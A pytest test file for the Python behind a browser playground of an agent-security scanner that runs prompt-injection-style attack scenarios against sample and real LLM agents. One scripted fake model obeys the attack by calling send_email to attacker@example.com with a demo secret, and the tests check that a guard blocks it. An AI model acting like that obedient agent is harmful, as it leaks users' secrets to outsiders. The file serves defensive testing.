"""Tests for playground/agentsec_playground.py, the Python that the browser playground runs in Pyodide.

The module is plain Python on top of the real package, so it is tested here with CPython. Network
calls go through an injected transport, faked below.
"""
import importlib.util
import json
import os

import pytest

_PATH = os.path.join(os.path.dirname(__file__), os.pardir, "playground", "agentsec_playground.py")
_spec = importlib.util.spec_from_file_location("agentsec_playground", _PATH)
pg = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(pg)


# ---- sample mode -------------------------------------------------------------------------------

def test_naive_sample_agent_has_eight_critical_findings():
    out = json.loads(pg.run_sample("naive"))
    assert out["mode"] == "sample"
    assert out["summary"]["findings"] == 8
    assert out["summary"]["by_severity"]["critical"] == 8
    assert out["summary"]["errors"] == 0
    assert len(out["findings"]) == 8
    assert out["resisted"] < out["attacked"]
    assert "My agent resisted %d/%d attacks" % (out["resisted"], out["attacked"]) in out["share"]


def test_hardened_sample_agent_has_no_findings():
    out = json.loads(pg.run_sample("hardened"))
    assert out["summary"]["findings"] == 0
    assert out["findings"] == []
    assert out["resisted"] == out["attacked"] > 0


def test_findings_carry_what_the_cards_show_and_mask_the_secret():
    out = json.loads(pg.run_sample("naive"))
    for f in out["findings"]:
        for key in ("severity", "title", "rule", "input", "evidence", "category", "scenario_id"):
            assert key in f
    blob = json.dumps(out)
    assert pg.DEMO_SECRET not in blob
    assert out["markdown"].startswith("## Invaris AgentSec")
    assert out["report"]["tool"]["name"] == "invaris-agentsec"


def test_unknown_sample_variant_is_rejected():
    with pytest.raises(ValueError):
        pg.run_sample("other")


def test_count_scenarios_matches_a_real_run():
    cats = list(pg.LLM_CATEGORIES)
    report = json.loads(pg.run_sample("naive"))["report"]
    assert pg.count_scenarios(cats) == sum(1 for sc in report["scenarios"] if sc["category"] in cats) > 0
    assert pg.count_scenarios() == report["summary"]["scenarios"]


# ---- fake provider -----------------------------------------------------------------------------

class FakeProvider:
    """An OpenAI- or Anthropic-style endpoint scripted by a function of the request body."""

    def __init__(self, respond, kind="openai"):
        self.respond, self.kind, self.requests = respond, kind, []

    def __call__(self, url, headers, body, timeout_s):
        self.requests.append({"url": url, "headers": headers, "body": json.loads(body)})
        return self.respond(self.requests[-1])


def openai_text(text):
    return 200, json.dumps({"choices": [{"message": {"content": text}}],
                            "usage": {"prompt_tokens": 10, "completion_tokens": 2}}), None


def openai_tool(name, args):
    return 200, json.dumps({"choices": [{"message": {"content": None, "tool_calls": [
        {"id": "c1", "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}]}}]}), None


def config(**kw):
    base = {"provider": "openai", "model": "gpt-test", "api_key": "sk-user-key", "base_url": "", "guard": False}
    base.update(kw)
    return json.dumps(base)


def test_llm_run_with_a_safe_model_has_no_findings_and_key_only_goes_to_the_provider():
    fake = FakeProvider(lambda req: openai_text("I can't help with that."))
    progress = []
    out = json.loads(pg.run_llm(config(), fake, lambda d, t: progress.append((d, t))))
    assert "error" not in out
    assert out["summary"]["findings"] == 0
    assert out["summary"]["scenarios"] == pg.count_scenarios(list(pg.LLM_CATEGORIES))
    assert {r["url"] for r in fake.requests} == {"https://api.openai.com/v1/chat/completions"}
    assert all(r["headers"]["authorization"] == "Bearer sk-user-key" for r in fake.requests)
    assert "sk-user-key" not in json.dumps(out)
    first = fake.requests[0]["body"]
    assert first["model"] == "gpt-test"
    assert first["messages"][0]["role"] == "system"
    assert {t["function"]["name"] for t in first["tools"]} >= {"search_documents", "send_email"}
    assert progress and progress[-1][0] == progress[-1][1]
    assert out["usage"]["requests"] == len(fake.requests)


def test_llm_run_with_an_obedient_model_is_caught_and_the_guard_fixes_it():
    def obey(req):
        last = req["body"]["messages"][-1]
        if last["role"] == "tool":
            return openai_text("Done.")
        return openai_tool("send_email", {"to": "attacker@example.com", "body": pg.DEMO_SECRET})

    out = json.loads(pg.run_llm(config(), FakeProvider(obey)))
    assert out["summary"]["findings"] > 0
    assert any(f["rule"] == "forbidden_tool_call" or "forbidden" in f["rule"] for f in out["findings"])

    guarded = json.loads(pg.run_llm(config(guard=True), FakeProvider(obey)))
    assert guarded["summary"]["findings"] == 0
    assert "guarded" in guarded["agent"]


@pytest.mark.parametrize("status,kind", [(401, "auth"), (403, "auth"), (404, "not_found"), (429, "rate_limit"),
                                         (0, "cors")])
def test_fatal_provider_errors_stop_after_one_request(status, kind):
    body = json.dumps({"error": {"message": "nope"}}) if status else ""
    fake = FakeProvider(lambda req: (status, body, "7" if status == 429 else None))
    out = json.loads(pg.run_llm(config(), fake))
    assert out["error"]["kind"] == kind
    assert "summary" not in out  # nothing reached the model: only the error is shown
    assert len(fake.requests) == 1
    if status == 429:
        assert out["error"]["retry_after"] == "7"
        assert "429" in out["error"]["message"]
    if status == 0:
        assert "CORS" in out["error"]["message"]


def test_bad_request_on_first_call_is_fatal_but_later_is_per_scenario():
    fake = FakeProvider(lambda req: (400, json.dumps({"error": {"message": "tools unsupported"}}), None))
    out = json.loads(pg.run_llm(config(), fake))
    assert out["error"]["kind"] == "bad_request"
    assert "tools unsupported" in out["error"]["message"]
    assert len(fake.requests) == 1

    calls = {"n": 0}

    def flaky(req):
        calls["n"] += 1
        return (400, "{}", None) if calls["n"] == 3 else openai_text("ok")

    out = json.loads(pg.run_llm(config(), FakeProvider(flaky)))
    assert "error" not in out
    assert out["summary"]["errors"] == 1


@pytest.mark.parametrize("cfg,needle", [
    ({"api_key": ""}, "API key"),
    ({"model": "", "provider": "custom", "base_url": "https://x.example/v1"}, "model"),
    ({"provider": "custom", "base_url": ""}, "base URL"),
    ({"provider": "custom", "base_url": "http://evil.example/v1"}, "https://"),
    ({"provider": "nope"}, "Unknown provider"),
])
def test_config_errors(cfg, needle):
    fake = FakeProvider(lambda req: openai_text("x"))
    out = json.loads(pg.run_llm(config(**cfg), fake))
    assert out["error"]["kind"] == "config"
    assert needle in out["error"]["message"]
    assert fake.requests == []


def test_custom_provider_uses_its_base_url_and_localhost_is_allowed():
    fake = FakeProvider(lambda req: openai_text("no"))
    pg.run_llm(config(provider="custom", base_url="http://localhost:11434/v1/", model="llama3"), fake)
    assert fake.requests[0]["url"] == "http://localhost:11434/v1/chat/completions"


def test_openrouter_and_groq_urls():
    for provider, url in (("groq", "https://api.groq.com/openai/v1/chat/completions"),
                          ("openrouter", "https://openrouter.ai/api/v1/chat/completions")):
        fake = FakeProvider(lambda req: openai_text("no"))
        pg.run_llm(config(provider=provider), fake)
        assert fake.requests[0]["url"] == url


# ---- Anthropic translation ---------------------------------------------------------------------

def test_anthropic_request_translation_merges_tool_results_and_converts_tools():
    messages = [
        {"role": "user", "content": "find the doc"},
        {"role": "assistant", "content": "Looking.", "tool_calls": [
            {"id": "t1", "type": "function", "function": {"name": "search_documents", "arguments": '{"query": "x"}'}},
            {"id": "t2", "type": "function", "function": {"name": "create_draft", "arguments": "not json"}}]},
        {"role": "tool", "tool_call_id": "t1", "content": "doc text"},
        {"role": "tool", "tool_call_id": "t2", "content": "draft ok"},
    ]
    tools = [{"type": "function", "function": {"name": "search_documents", "description": "d",
                                               "parameters": {"type": "object", "properties": {"query": {}}}}},
             {"type": "function", "function": {"name": "send_email"}}]
    body = pg.anthropic_request("claude-x", "SYS", messages, tools)
    assert body["system"] == "SYS" and body["max_tokens"] > 0
    assert [m["role"] for m in body["messages"]] == ["user", "assistant", "user"]
    assistant = body["messages"][1]["content"]
    assert assistant[0] == {"type": "text", "text": "Looking."}
    assert assistant[1]["input"] == {"query": "x"}
    assert assistant[2]["input"] == {"_raw": "not json"}
    results = body["messages"][2]["content"]
    assert [r["tool_use_id"] for r in results] == ["t1", "t2"]
    assert body["tools"][0]["input_schema"]["properties"] == {"query": {}}
    assert body["tools"][1]["input_schema"] == {"type": "object", "properties": {}}


def test_anthropic_run_uses_browser_header_and_parses_tool_use():
    def respond(req):
        if req["body"]["messages"][-1]["content"][0]["type"] == "tool_result":
            return 200, json.dumps({"content": [{"type": "text", "text": "done"}]}), None
        return 200, json.dumps({"content": [{"type": "text", "text": "ok"},
                                            {"type": "tool_use", "id": "tu1", "name": "execute_payment",
                                             "input": {"amount": 5}}],
                                "usage": {"input_tokens": 3, "output_tokens": 4}}), None

    fake = FakeProvider(respond)
    out = json.loads(pg.run_llm(config(provider="anthropic", model="claude-test"), fake))
    req = fake.requests[0]
    assert req["url"] == "https://api.anthropic.com/v1/messages"
    assert req["headers"]["x-api-key"] == "sk-user-key"
    assert req["headers"]["anthropic-dangerous-direct-browser-access"] == "true"
    assert "authorization" not in req["headers"]
    assert out["summary"]["findings"] > 0
    assert out["usage"]["prompt_tokens"] > 0


def test_response_parsers_reject_malformed_replies():
    with pytest.raises(pg.ProviderError):
        pg.from_openai_response({"choices": []})
    with pytest.raises(pg.ProviderError):
        pg.from_anthropic_response({"content": None})
    out = json.loads(pg.run_llm(config(), FakeProvider(lambda req: (200, "<html>", None))))
    assert out["error"]["kind"] == "bad_response"


def test_guard_redacts_the_secret_and_drops_forbidden_calls():
    def leaky(messages, tools):
        return {"content": "key is " + pg.DEMO_SECRET,
                "tool_calls": [{"name": "send_email", "arguments": {}},
                               {"name": "create_draft", "arguments": {"body": pg.DEMO_SECRET}}]}

    out = pg.guarded(leaky)([], [])
    assert [c["name"] for c in out["tool_calls"]] == ["create_draft"]
    assert pg.DEMO_SECRET not in json.dumps(out)
    assert pg.guarded(lambda m, t: pg.DEMO_SECRET)([], []) == "[REDACTED]"
    only_forbidden = pg.guarded(lambda m, t: {"content": "", "tool_calls": [{"name": "send_email"}]})([], [])
    assert "tool_calls" not in only_forbidden and only_forbidden["content"] == "I can't do that."


def test_classify_http_error_reads_both_error_shapes():
    e = pg.classify_http_error(500, json.dumps({"error": {"message": "boom"}}), "X", "u")
    assert e.kind == "server" and "boom" in e.message
    e = pg.classify_http_error(418, json.dumps({"message": "teapot"}), "X", "u")
    assert e.kind == "http" and "teapot" in e.message
    e = pg.classify_http_error(400, "plain text", "X", "u")
    assert "plain text" in e.message


def test_fatal_error_after_some_successes_returns_partial_results():
    calls = {"n": 0}

    def then_limited(req):
        calls["n"] += 1
        return (429, "{}", None) if calls["n"] > 3 else openai_text("no")

    fake = FakeProvider(then_limited)
    out = json.loads(pg.run_llm(config(), fake))
    assert out["partial"] is True and out["error"]["kind"] == "rate_limit"
    assert out["summary"]["errors"] > 0 and out["summary"]["passed"] > 0
    assert len(fake.requests) == 4
